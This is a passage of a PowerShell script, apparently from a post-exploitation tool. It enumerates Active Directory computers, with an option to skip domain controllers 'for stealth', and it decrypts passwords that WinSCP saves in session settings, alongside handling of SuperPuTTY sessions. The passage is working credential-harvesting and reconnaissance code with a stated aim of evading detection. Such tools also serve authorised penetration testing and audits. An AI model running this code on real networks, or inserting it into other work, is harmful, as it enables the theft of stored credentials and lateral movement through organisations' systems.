  $UserObject | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -Value $ArrayOfSuperPuTTYSessions
} # ProcessSuperPuTTYFile
function GetComputersFromActiveDirectory {
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
  $objSearcher.SearchRoot = $objDomain
  if ($ExcludeDC) {
      Write-Verbose "Skipping enumeration against the Domain Controller(s) for stealth."
      $Filter = "(&(objectCategory=computer)(!userAccountControl:1.2.840.113556.1.4.803:=8192))"
    } else {
      $Filter = "(objectCategory=computer)"
    }
  $objSearcher.Filter = $Filter
  $colProplist = "name"
  foreach ($i in $colPropList){$objSearcher.PropertiesToLoad.Add($i)}
  $objSearcher.FindAll()
}
function DecryptNextCharacterWinSCP($remainingPass) {
  $flagAndPass = "" | Select-Object -Property flag,remainingPass
  $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
  $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
  $Added = $firstval + $secondval
  $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
  $flagAndPass.flag = $decryptedResult
  $flagAndPass.remainingPass = $remainingPass.Substring(2)
   $flagAndPass
}
function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {
  $CheckFlag = 255
  $Magic = 163
  $len = 0
  $key =  $SessionHostname + $SessionUsername
  $values = DecryptNextCharacterWinSCP($Password)
  $storedFlag = $values.flag 
  if ($values.flag -eq $CheckFlag) {
    $values.remainingPass = $values.remainingPass.Substring(2)
    $values = DecryptNextCharacterWinSCP($values.remainingPass)
  }
  $len = $values.flag
  $values = DecryptNextCharacterWinSCP($values.remainingPass)
  $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
  $finalOutput = ""
  for ($i=0; $i -lt $len; $i++) {
    $values = (DecryptNextCharacterWinSCP($values.remainingPass))
    $finalOutput += [char]$values.flag
  }
  if ($storedFlag -eq $CheckFlag) {
     $finalOutput.Substring($key.length)
  }
   $finalOutput
}
